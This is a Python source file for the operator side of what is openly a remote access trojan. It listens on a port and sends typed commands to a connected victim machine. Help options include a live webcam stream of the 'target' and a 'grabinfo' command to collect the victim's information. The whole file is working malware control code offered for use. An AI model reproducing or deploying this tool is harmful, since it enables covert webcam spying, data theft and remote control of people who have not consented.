import sys
import socket
import os

Banner = ("""
 █████╗  ██████╗ ██████╗███████╗███████╗███████╗     ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║     ██║     ███████╗█████╗  ███████╗    ██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║
██╔══██║██║     ██║     ╚════██║██╔══╝  ╚════██║    ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
██║  ██║╚██████╗╚██████╗███████║███████╗███████║    ╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ 
""")

HOST = sys.argv[1] if len(sys.argv) > 1 else ''
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 8080)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

while True:
    print(f'[*] listening at {PORT}')
    client, addr = s.accept()
    print(f'[*] client connected {addr}')

    while True:
        cmd = input("Enter command> ")
        client.send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            s.close()
            break
        if cmd.lower() == "help":
            print("""
            q, quit, x, exit: Close connection
            web.stream: Get live feed of target
            stream.stop: Close webcam connection
            grabinfo: Grab info of victem.
            """)
        if cmd.lower() == "web.stream":
            os.system("start server.pyw")
        if cmd.lower() == "stream.stop":
            os.system("taskkill /F /im pythonw.exe")
        if cmd.lower() == "grabinfo":
            result = s.recv(2048).decode("utf-8")
            print(result)

        result = client.recv(2048).decode("utf-8")
        print(result)

    client.close()
